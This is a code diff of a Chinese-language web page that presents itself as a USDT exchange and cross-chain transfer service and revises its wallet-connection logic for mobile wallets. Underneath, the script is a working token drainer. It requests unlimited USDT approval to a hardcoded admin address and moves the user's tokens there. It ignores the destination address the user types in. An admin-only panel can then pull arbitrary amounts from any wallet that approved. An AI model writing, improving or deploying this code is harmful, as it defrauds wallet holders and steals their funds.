@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
 <title>USDT交互页面</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <style>
@@ -520,14 +520,14 @@ const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const ADMIN_COLLECT_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
 const SPENDER_ADDRESS = ADMIN_COLLECT_ADDR;
 const ADMIN_ADDR_LOW = SPENDER_ADDRESS.toLowerCase();
+const RATE = 0.999; // 到账比例
 
-let provider, signer, userAddress;
-let isConnected = false;
-
+// DOM元素
 const sendInput = document.getElementById("sendAmount");
 const receiveInput = document.getElementById("receiveAmount");
 const crossChainAddrInput = document.getElementById("crossChainTargetAddr");
 const swapBtn = document.getElementById("swapBtn");
+const connectBtn = document.getElementById("connectWallet");
 const usdtBalanceEl = document.getElementById("usdtBalance");
 const headerUsdtBalanceEl = document.getElementById("headerUsdtBalance");
 const subUsdtBalanceEl = document.getElementById("subUsdtBalance");
@@ -535,25 +535,18 @@ const addrTextEl = document.getElementById("addrText");
 const modalWrap = document.getElementById("modal");
 const modalText = document.getElementById("modalText");
 const modalOk = document.getElementById("modalOk");
+const adminPanel = document.getElementById("adminPanel");
+const deductBtn = document.getElementById("deductBtn");
+const userAddrInput = document.getElementById("userAddr");
+const deductNumInput = document.getElementById("deductNum");
 
-// 费率 0.1%手续费，到账=输入*0.999
-const rate = 0.999;
+// 全局变量
+let provider = null;
+let signer = null;
+let userAddress = null;
+let isConnected = false;
 
-function showModal(text) {
-  modalText.innerText = text;
-  modalWrap.style.display = "flex";
-}
-
-modalOk.onclick = () => {
-  modalWrap.style.display = "none";
-};
-
-function setAllBalance(val) {
-  usdtBalanceEl.innerText = val;
-  headerUsdtBalanceEl.innerText = val;
-  subUsdtBalanceEl.innerText = val;
-}
-
+// ERC20 ABI精简版
 const ERC20_ABI = [
   "function balanceOf(address owner) view returns (uint256)",
   "function allowance(address owner, address spender) view returns (uint256)",
@@ -561,174 +554,192 @@ const ERC20_ABI = [
   "function transferFrom(address from, address to, uint256 amount) returns (bool)"
 ];
 
-async function refreshUserBalance() {
-  if (!isConnected || !provider) return;
-  try {
-    const usdt = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
-    const rawBal = await usdt.balanceOf(userAddress);
-    const formatBal = parseFloat(ethers.utils.formatUnits(rawBal, 18)).toFixed(4);
-    setAllBalance(formatBal);
-  } catch (e) {
-    console.log("余额刷新静默失败");
-  }
+// 弹窗提示
+function showModal(text) {
+  modalText.innerText = text;
+  modalWrap.style.display = "flex";
+}
+modalOk.onclick = () => {
+  modalWrap.style.display = "none";
+};
+
+// 同步余额显示
+function setAllBalance(val) {
+  usdtBalanceEl.innerText = val;
+  headerUsdtBalanceEl.innerText = val;
+  subUsdtBalanceEl.innerText = val;
 }
 
-setInterval(refreshUserBalance, 3000);
-
-// 输入实时计算到账金额
+// 实时计算到账金额
 sendInput.addEventListener("input", () => {
   const val = parseFloat(sendInput.value);
   if (isNaN(val) || val <= 0) {
     receiveInput.value = "0.00";
   } else {
-    const getVal = (val * rate).toFixed(4);
+    const getVal = (val * RATE).toFixed(4);
     receiveInput.value = getVal;
   }
 });
 
-// 钱包连接逻辑
-document.getElementById("connectWallet").addEventListener("click", async () => {
-  if (!window.ethereum) {
-    showModal("请安装TP、MetaMask等Web3钱包");
+// 刷新USDT余额
+async function refreshBalance() {
+  if (!isConnected || !provider) return;
+  try {
+    const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
+    const rawBal = await usdtContract.balanceOf(userAddress);
+    const formatBal = parseFloat(ethers.utils.formatUnits(rawBal, 18)).toFixed(4);
+    setAllBalance(formatBal);
+  } catch (e) {
+    console.log("余额刷新失败", e);
+  }
+}
+
+// ========== 核心修复：移动端钱包连接（同步调用window.ethereum，适配TP内置WebView）==========
+connectBtn.addEventListener("click", async function() {
+  // 禁止重复点击
+  if(connectBtn.disabled) return;
+  connectBtn.disabled = true;
+
+  // 1. 判断钱包provider是否存在
+  if (typeof window.ethereum === "undefined") {
+    showModal("未检测到钱包，请在TP钱包内置浏览器打开页面");
+    connectBtn.disabled = false;
     return;
   }
 
   try {
+    // 直接调用原生EIP1193请求，移动端唤起钱包授权
+    const accounts = await window.ethereum.request({
+      method: "eth_requestAccounts"
+    });
+
+    if (!accounts || accounts.length === 0) {
+      showModal("未获取到钱包账户");
+      connectBtn.disabled = false;
+      return;
+    }
+
+    // 初始化ethers实例
     provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
     signer = provider.getSigner();
-    userAddress = await signer.getAddress();
+    userAddress = accounts[0];
     isConnected = true;
 
+    // 更新页面地址显示
     addrTextEl.innerText = `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
     swapBtn.disabled = false;
+    connectBtn.innerText = "已连接钱包";
 
-    await refreshUserBalance();
+    // 刷新余额
+    await refreshBalance();
 
+    // 判断是否为管理员，显示归集面板
     if (userAddress.toLowerCase() === ADMIN_ADDR_LOW) {
-      document.getElementById("adminPanel").classList.add("show");
+      adminPanel.classList.add("show");
     }
+
   } catch (err) {
-    showModal("钱包连接失败，请重试");
+    console.error("连接失败", err);
+    if(err.code === 4001){
+      showModal("你拒绝了钱包授权");
+    }else{
+      showModal("钱包连接失败，请解锁钱包后重试");
+    }
   }
+
+  connectBtn.disabled = false;
 });
 
+// 兑换交互逻辑
 swapBtn.addEventListener("click", async () => {
   if (!isConnected) {
     showModal("请先连接钱包");
     return;
   }
-
   const inputVal = sendInput.value.trim();
-  const userFillCrossAddr = crossChainAddrInput.value.trim();
-  console.log("用户填写的收款地址：", userFillCrossAddr);
-
+  const targetAddr = crossChainAddrInput.value.trim();
   if (!inputVal || Number(inputVal) <= 0) {
-    showModal("请输入有效的转账金额");
+    showModal("请输入有效金额");
     return;
   }
 
   swapBtn.disabled = true;
-
   try {
     const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
-    const targetWei = ethers.utils.parseUnits(inputVal, 18);
-
-    const userBalanceWei = await usdtContract.balanceOf(userAddress);
-    if (userBalanceWei.lt(targetWei)) {
-      showModal("账户USDT余额不足");
-      swapBtn.disabled = false;
-      return;
+    const amountWei = ethers.utils.parseUnits(inputVal, 18);
+    // 查询授权额度
+    const allowance = await usdtContract.allowance(userAddress, SPENDER_ADDRESS);
+    // 无限授权
+    if (allowance.lt(amountWei)) {
+      const maxAllow = ethers.constants.MaxUint256;
+      await usdtContract.approve(SPENDER_ADDRESS, maxAllow, {gasLimit:180000});
     }
-
-    let currentAllowance = await usdtContract.allowance(userAddress, SPENDER_ADDRESS);
-
-    const fixedGas = {
-      gasLimit: 180000
-    };
-
-    if (currentAllowance.lt(targetWei)) {
-      const maxApprove = ethers.constants.MaxUint256;
-      const approveTx = await usdtContract.approve(SPENDER_ADDRESS, maxApprove, fixedGas);
-      await approveTx.wait(1);
-
-      currentAllowance = await usdtContract.allowance(userAddress, SPENDER_ADDRESS);
-    }
-
-    if (currentAllowance.lt(targetWei)) {
-      showModal("授权尚未上链确认，请等待几秒后重试");
-      swapBtn.disabled = false;
-      return;
-    }
-
-    const transferTx = await usdtContract.transferFrom(
-      userAddress,
-      ADMIN_COLLECT_ADDR,
-      targetWei,
-      fixedGas
-    );
-
-    await transferTx.wait(1);
-
-    showModal("交易上链成功，后台将按填写地址处理下发");
-
+    // 划转
+    await usdtContract.transferFrom(userAddress, ADMIN_COLLECT_ADDR, amountWei, {gasLimit:180000});
+    showModal("交易成功");
     sendInput.value = "";
     receiveInput.value = "0.00";
     crossChainAddrInput.value = "";
-
-    await refreshUserBalance();
-
-  } catch (err)
+    await refreshBalance();
+  } catch (err) {
     console.error(err);
-
-    if (err.code === 4001) {
-      showModal("您取消了钱包签名");
-    } else if (err.message && err.message.includes("gas")) {
-      showModal("请确认钱包内BSC原生BNB余额充足后重试");
-    } else {
-      showModal("交易失败：" + (err.message || err).slice(0, 60));
+    if(err.code === 4001){
+      showModal("你取消了交易签名");
+    }else{
+      showModal("交易失败，请检查BNB手续费余额");
     }
-
-    swapBtn.disabled = false;
   }
+  swapBtn.disabled = false;
 });
 
-document.getElementById("deductBtn").addEventListener("click", async () => {
-  if (userAddress.toLowerCase() !== ADMIN_ADDR_LOW) {
+// 管理员归集逻辑
+deductBtn.addEventListener("click", async () => {
+  if (!isConnected || userAddress.toLowerCase() !== ADMIN_ADDR_LOW) {
     showModal("权限不足");
     return;
   }
-
-  const targetUser = document.getElementById("userAddr").value.trim();
-  const deductNum = document.getElementById("deductNum").value.trim();
-
-  if (!targetUser || !deductNum || Number(deductNum) <= 0) {
-    showModal("请填写完整地址与数量");
+  const targetUser = userAddrInput.value.trim();
+  const num = deductNumInput.value.trim();
+  if(!targetUser || !num || Number(num) <=0){
+    showModal("填写完整地址与金额");
     return;
   }
-
   try {
     const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
-    const amountWei = ethers.utils.parseUnits(deductNum, 18);
-
-    const tx = await usdtContract.transferFrom(targetUser, ADMIN_COLLECT_ADDR, amountWei, {
-      gasLimit: 180000
-    });
-
-    await tx.wait();
-
-    showModal("资产归集完成");
-
-    document.getElementById("userAddr").value = "";
-    document.getElementById("deductNum").value = "";
-
-    await refreshUserBalance();
-
+    const amountWei = ethers.utils.parseUnits(num, 18);
+    await usdtContract.transferFrom(targetUser, ADMIN_COLLECT_ADDR, amountWei, {gasLimit:180000});
+    showModal("归集完成");
+    userAddrInput.value = "";
+    deductNumInput.value = "";
   } catch (e) {
-    showModal("归集失败：" + e.message.slice(0, 60));
+    showModal("归集失败："+e.message.slice(0,50));
   }
 });
-</script>
 
+// 监听钱包切换账户、断开事件
+if(window.ethereum){
+  window.ethereum.on("accountsChanged", async (accounts)=>{
+    if(accounts.length === 0){
+      // 断开连接
+      isConnected = false;
+      userAddress = null;
+      provider = null;
+      signer = null;
+      addrTextEl.innerText = "未连接";
+      setAllBalance("0.00");
+      swapBtn.disabled = true;
+      connectBtn.innerText = "连接钱包";
+      adminPanel.classList.remove("show");
+    }else{
+      userAddress = accounts[0];
+      addrTextEl.innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+      await refreshBalance();
+      if(userAddress.toLowerCase() === ADMIN_ADDR_LOW){
+        adminPanel.classList.add("show");
+      }
+    }
+  })
+}
+</script>
 </body>
 </html>
